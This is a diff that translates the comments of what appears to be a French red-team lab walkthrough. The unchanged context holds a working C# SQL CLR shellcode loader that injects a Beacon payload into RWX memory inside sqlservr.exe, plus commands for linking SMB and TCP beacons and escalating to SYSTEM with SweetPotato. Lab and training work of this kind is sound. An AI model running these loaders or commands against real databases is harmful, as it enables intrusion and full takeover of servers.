@@ -160,7 +160,7 @@ public partial class StoredProcedures
 
         byte[] shellcode;
 
-        // read embedded payload — name must match: <AssemblyName>.<filename>
+        // Lire le payload intégré : le nom doit correspondre à <AssemblyName>.<filename>
         using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
         {
             using (var ms = new MemoryStream())
@@ -170,14 +170,14 @@ public partial class StoredProcedures
             }
         }
 
-        // allocate RWX memory inside sqlservr.exe
+        // Allouer la mémoire RWX dans sqlservr.exe
         var hMemory = VirtualAlloc(
             IntPtr.Zero,
             (uint)shellcode.Length,
             VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
             PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
 
-        // copy shellcode into allocated memory
+        // Copier les octets du payload dans la mémoire allouée
         WriteProcessMemory(
             new IntPtr(-1),
             hMemory,
@@ -185,7 +185,7 @@ public partial class StoredProcedures
             (uint)shellcode.Length,
             out _);
 
-        // execute shellcode in a new thread
+        // Exécuter le payload dans un nouveau thread
         var hThread = CreateThread(
             IntPtr.Zero,
             0,
@@ -194,7 +194,7 @@ public partial class StoredProcedures
             THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
             out _);
 
-        // close the thread handle — thread continues running (beacon stays alive)
+        // Fermer le handle ; le thread continue son exécution
         CloseHandle(hThread);
     }
 
@@ -298,7 +298,7 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
 8. **BEACON SYSTEM - rsteel** — Établir la connexion avec le Beacon de `lon-db-1`.
 
-    > **Pourquoi `link` ?** Ce Beacon SMB utilise une named pipe et attend une connexion depuis un autre Beacon ayant accès à `lon-db-1`. Cette liaison construit le tunnel : `CS Team Server → your beacon → SMB pipe → SQL beacon`.
+    > **Pourquoi `link` ?** Ce Beacon SMB utilise une named pipe et attend une connexion depuis un autre Beacon ayant accès à `lon-db-1`. Cette liaison construit le tunnel : `CS Team Server → Beacon initial → named pipe SMB → Beacon SQL`.
 
     > **Prérequis CIFS :** l’accès à la named pipe SMB nécessite une authentification adaptée. En l’absence de ticket ou d’autorisations suffisantes, `ERROR_LOGON_FAILURE` peut apparaître.
 
@@ -489,7 +489,7 @@ execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows
 connect localhost 1337
 ```
 
-    > Résultat présenté dans le lab : `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` on lon-db-2.
+    > Résultat présenté dans le lab : `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` sur lon-db-2.
 
     > **localhost :** le Beacon tcp-local écoute sur `127.0.0.1:1337` dans `lon-db-2`. La connexion s’effectue depuis un autre Beacon du même hôte.  
     > `OPSEC-🟢SAFE` dans les notes — connexion locale TCP loopback.  
